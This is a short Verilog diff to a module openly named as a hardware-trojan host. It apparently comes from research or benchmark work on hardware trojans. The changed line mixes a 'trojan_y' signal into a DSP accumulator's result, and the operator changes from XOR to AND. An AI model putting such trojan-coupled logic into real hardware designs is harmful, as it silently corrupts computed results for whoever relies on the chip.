@@ -90,7 +90,7 @@ module trojan8_dsp1_host #(
             result_valid <= 1'b0;
         end else begin
             // Mix DSP accumulator result with trojan output
-            dsp_result <= accumulator ^ trojan_y;  // Use accumulator instead of direct pipeline
+            dsp_result <= accumulator & trojan_y;  // Use accumulator instead of direct pipeline
             result_valid <= pipeline_valid[PIPELINE_STAGES-1];
         end
     end
